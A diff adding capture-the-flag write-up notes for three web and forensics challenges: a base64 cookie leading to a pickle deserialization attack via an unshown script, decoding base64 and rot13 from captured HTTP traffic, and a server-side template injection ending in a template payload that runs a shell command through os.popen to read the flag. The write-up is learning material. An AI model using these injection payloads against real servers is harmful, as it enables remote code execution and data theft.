@@ -133,4 +133,42 @@ try dirsearch and chek urls
 for /auth We are not allowed to use GET requests because we got some error, 
 so let’s try to use POST  requests.
 
+# sweet and sour
+Usually, when something similar is noticed, it is recommended to look in the header section of the web application. 
+From header we can obtain, that it is python server and set-cookie is shown right there
+curl -i URL
+
+Once we try to decode the cookie using base64, we can see, that some words appeared as the result
+echo -n "cookie" | base64 -d 
+
+After decoding the cookie, we obtain the message "Try harder" and some junk data. Based on what information we have gathered until now ( Python server, cookies in base64 format + some junk ) we can conclude that this is a pickle server. At this moment we can send some pickle payloads to the server which will lead to arbitrary file read vulnerability. 
+
+*run python payload change only URl*
+python PayLoad.py
+
+# online-encryption
+Search for traffic using http filter. 10476... Follow the HTTP stream with the shortcut Ctrl+Alt+Shift+H
+
+Eventually we can spot suspicious traffic to www.txtwizard.net (plain text). filter for 10.0.0...
+
+Now we can copy the messages and filter them with regexes in a text edition with an engine
+implemented to get only the plainText argument values.
+An example regex is:
+plainText=(.*?)&key
+
+https://base64decode.org/
+
+After we convert from base64, we can observe that the new text seems to be obfuscated with: rot13 RPFP{qq545sos12sq608qnn8p201s50s95p8520orp9s744n3573o1qp0op53pr019726}
+
+# shark
+Server Side Template Injection
+{{7*7}}
+
+curl -I URL
+
+burp suit: 
+name=<%
+import os
+x=os.popen('cat flag').read()
+%>${x}
 
